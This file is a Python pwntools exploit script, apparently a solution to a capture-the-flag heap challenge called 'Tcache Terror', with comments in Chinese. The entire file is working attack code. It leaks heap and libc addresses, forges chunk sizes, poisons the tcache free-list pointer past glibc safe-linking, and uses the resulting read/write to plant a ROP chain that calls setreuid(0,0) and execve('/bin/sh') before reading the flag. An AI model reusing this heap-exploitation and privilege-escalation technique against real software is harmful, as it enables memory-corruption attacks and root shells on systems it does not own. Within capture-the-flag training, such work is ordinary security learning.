# Tcache Terror
import pwn
from dojotool import find_challenge
from dojotool.pwntool import tee


def one_round(io: pwn.process) -> None:

    def protect_ptr(pos: int, ptr: int) -> int:
        return (pos >> 12) ^ ptr

    def read_mem(idx, idx_size):
        io.recvrepeat(0.1)
        io.sendline(b"safe_write %d" % idx)
        io.recvuntil(b"Index: \n")
        if "easy" in str(io.executable):
            io.recvuntil(b"])\n")
        mem = bytearray(io.recvn(idx_size + 0x10))
        print()
        print(pwn.hexdump(mem, total=False))
        return mem

    def write_mem(idx, mem):
        io.sendline(b"safe_read %d" % idx)
        io.sendline(bytes(mem))

    def read_heap_base():
        chunk_size = 0x10
        io.sendline(b"malloc 0 %d" % chunk_size)
        io.sendline(b"free 0")
        io.sendline(b"malloc 0 %d" % chunk_size)
        mem = read_mem(0, chunk_size + 0x10)
        return pwn.u64(mem[0x00:0x08]) << 12

    def read_libc_base():
        tchunk_size = 0x420
        io.sendline(b"malloc 0 %d" % tchunk_size)
        io.sendline(b"malloc 1 %d" % 0x10)
        io.sendline(b"free 0")
        io.sendline(b"malloc 0 %d" % tchunk_size)
        mem = read_mem(0, tchunk_size + 0x10)  # 读出 #0 的内容，确认是 free 后的内容
        return pwn.u64(mem[0x00:0x08]) - 0x219CE0  # 分析 libc.so.6 和 gdb 得到 main_arena 的偏移量

    addr_heap = read_heap_base()
    pwn.success(f"heap: {hex(addr_heap)}")
    addr_libc = read_libc_base()
    pwn.success(f"libc: {hex(addr_libc)}")
    libc = io.libc
    assert libc
    libc.address = addr_libc
    addr_environ = libc.symbols["environ"]
    pwn.success(f"envp: {hex(addr_environ)}")

    def read_addr(addr, read_size):
        small_size = 0x10  # 任意小的可以分配的尺寸就够了
        chunk_size = small_size * 2  # #1 的扩展后尺寸
        io.sendline(b"malloc 0 %d" % small_size)  # 用于修改 #1 的 size
        io.sendline(b"malloc 1 %d" % small_size)  # 会被扩展 size 到下一个 malloc
        io.sendline(b"safe_read 0")  # 在 free #1 之前修改 #1 的 size
        io.sendline(
            pwn.flat(
                {
                    small_size + 0x00: 0x00,  # prev_size, as a makrer
                    small_size + 0x08: (chunk_size + 0x10) | 0x1,  # size
                }
            )
        )
        io.sendline(b"free 1")
        io.sendline(b"malloc 1 %d" % chunk_size)  # 重新获得这块包含了 #1 和 #2 的内存

        io.sendline(b"malloc 2 %d" % read_size)  # 内容能从 #1 读到
        io.sendline(b"malloc 3 %d" % read_size)  # 被用于修改 next tchunk 的 fd 指针
        io.sendline(b"free 3")
        io.sendline(b"free 2")
        mem = read_mem(1, chunk_size)
        mem[0x20:0x28] = pwn.p64(protect_ptr(addr_heap, addr))
        write_mem(1, mem)
        io.sendline(b"malloc 2 %d" % read_size)
        io.sendline(b"malloc 3 %d" % read_size)
        return read_mem(3, read_size)

    addr_environ_on_stack = pwn.u64(read_addr(addr_environ, 0x20)[:0x08])
    pwn.success(f"environ_on_stack: {hex(addr_environ_on_stack)}")
    addr_main_return_rip = addr_environ_on_stack - 0x120  # gdb 分析得到

    rop = pwn.ROP(libc)
    rop.call("setreuid", [0, 0])
    rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])
    rop_buffer = 0x80

    mem = read_addr(addr_main_return_rip - 0x8, rop_buffer)  # align
    mem[0x08:] = rop.chain()
    print("MEM\n", pwn.hexdump(mem, total=False))
    write_mem(3, mem)

    # pwn.gdb.attach(io, "source /opt/gef/gef.py\ntelescope\nb *main+1741")
    io.sendline(b"quit")
    io.sendline(b"id; cat /flag; exit")


def ctf() -> None:
    root_bin = find_challenge()
    with pwn.process(root_bin, raw=True, level="error") as io:
        tee(io)
        try:
            one_round(io)
            io.recvrepeat()
        except Exception:
            io.recvrepeat(0.5)
            raise


if __name__ == "__main__":
    ctf()
